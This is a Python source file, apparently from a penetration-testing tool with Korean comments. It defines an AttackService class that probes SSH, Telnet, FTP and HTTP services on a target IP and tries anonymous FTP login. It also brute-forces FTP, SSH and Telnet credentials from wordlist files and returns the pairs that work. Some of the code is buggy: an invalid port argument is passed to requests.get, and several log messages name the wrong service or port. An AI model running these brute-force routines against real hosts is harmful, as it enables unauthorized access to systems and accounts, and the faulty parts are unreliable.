import getpass
import telnetlib
from paramiko import SSHClient, AutoAddPolicy
import paramiko
import ftplib
import requests as req
import time
import os
from src.core.CustomFunc import *

class AttackService:
    def __init__(self, targetIp):
        self.targetIp = targetIp


    """
    Scanner section은 포트가 파라미터로 넘어오면 해당 포트로 서비스를 체크한다
    포트가 넘어오지 않는다면 서비스별 디폴트 포트로 서비스를 스캔한다.
    서비스가 로드 되는지만 확인 후 True or False로 반환한다.
    """
    #SSH service scan
    def sshScan(self, port=None) -> bool:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())

        try:
            if port==None:
                message = "Try ssh scan " + str(self.targetIp) + " port : " + str(22)
                p_print(message)
                id = ssh.connect(self.targetIp, port=22)
                print(id)
                ssh.close()
            else:
                message = "Try ssh scan " + str(self.targetIp) + " port : " + str(22)
                p_print(message)
                ssh.connect(self.targetIp, port=port, timeout=5)
                ssh.close()

            return True

        except Exception as e:
            if "Authentication" in str(e):
                return True
            else:
                return False

    #Telnet service scan
    def telnetScan(self, port=None) -> bool:
        isTelnet = False

        try:
            if port==None:
                p_print(f"Try to scan telnet service {self.targetIp} port : 23")
                tn = telnetlib.Telnet(self.targetIp)
            else:
                p_print(f"Try to scan telnet service {self.targetIp} port : {port}")
                tn = telnetlib.Telnet(self.targetIp, port=port)

            response = tn.read_until(b"login").decode('ascii')

            if "login" in response:
                isTelnet = True

        #기본값이 true임으로 pass
        except Exception as e:
            pass

        return isTelnet


    #Ftp service scan
    def ftpScan(self, port=None) -> bool:
        try:
            ftp = ftplib.FTP()
            if port is not None:
                p_print(f"Try to scan FTP service {self.targetIp} port : {port}")
                ftp.connect(self.targetIp, port, timeout=5)
            else:
                p_print(f"Try to scan FTP service {self.targetIp} port : 21")
                ftp.connect(self.targetIp, 21, timeout=5)
            return True
        except Exception as e:
            return False

    def httpScan(self, port=None) -> bool:
        try:
            if port is not None:
                p_print(f"Try to scan telnet service {self.targetIp} port : 23")
                res = req.get(url=self.targetIp, port=port)

                if res.status_code in [200, 403, 400, 500]:
                    return True
                else:
                    return False

            else:
                p_print(f"Try to scan telnet service {self.targetIp} port : 23")
                res = req.get(url=self.targetIp)

                if res.status_code in [200, 403, 400, 500]:
                    return True
                else:
                    return False

        except Exception as e:
            return False


    """
    
    익명 로그인, 실제 공격 모듈
    portscan이 끝난 이후로 수행되는 로직
    
    """
    def ftpLfi(self):
        pass


    def anonLogin(self, port=None) -> bool:
        try:
            ftp = ftplib.FTP()

            if port==None:
                p_print(f"Try to Login Annonymous {self.targetIp} port : 21")

                ftp.connect(self.targetIp, 21, timeout=5)
                ftp.login()
                ftp.quit()
            else:
                p_print(f"Try to Login Annonymous {self.targetIp} port : {port}")

                ftp.connect(self.targetIp, int(port), timeout=5)
                ftp.login()
                ftp.quit()

            return {"scan":"success"}

        except Exception as e:
            e_print("FTP Annoymous scan fail error : " + str(e))
            return False

    def ftpBruteLogin(self, port):
        p_print(f"Try to FTP BF target : {self.targetIp} port : {port}")
        file = open('src/view/static/data/ftpLoginInfo.txt', 'r')
        time.sleep(0.3)

        for line in file.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')

            try:
                ftp = ftplib.FTP(self.targetIp, port, timeout=3)
                ftp.login(userName, passWord)
                print('\n[*] ' + str(self.targetIp) + ' FTP Login Succeeded: ' + userName + '/' + passWord)
                ftp.quit()
                return {'info' : [userName,passWord]}

            except Exception as e:
                pass

        print('\n[-] Could not brute force FTP credentials.')
        file.close()

        return {'message':'Fail'}

    def sshBruteLogin(self, port):
        p_print(f"Try to SSH BF target : {self.targetIp} port : {port}")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())

        file = open('src/view/static/data/sshLoginInfo.txt', 'r')

        for line in file.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')

            try:
                res = ssh.connect(self.targetIp, port=port, username=userName, password=passWord)
            except:
                res = 0

            if res is None:
                ssh.close()
                return {'info' : [userName,passWord]}

            elif res==0:
                time.sleep(0.3)

        ssh.close()
        file.close()
        return {'message':'Fail'}

    def telnetBruteLogin(self, port):
        p_print(f"Try to SSH Telnet target : {self.targetIp} port : {port}")
        file = open('src/view/static/data/telnetLoginInfo.txt', 'r')

        for line in file.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')

            try:
                telnet = telnetlib.Telnet(self.targetIp, port, timeout=3)
                telnet.read_until(b"login: ")
                telnet.write(userName.encode('ascii') +b"\n")
                telnet.read_until(b"Password: ")
                telnet.write(passWord.encode('ascii') +b"\n")
                index, match, response = telnet.expect([b"Login incorrect", b"$"], timeout=2)

                if index == 1:
                    telnet.write(b"exit\n")
                    telnet.close()
                    return {'info' : [userName,passWord]}
            except:
                pass

        return {'message':'Fail'}


if __name__=="__main__":
    a = AttackService("127.0.0.1")
    b = a.sshScan(22)
    print(b)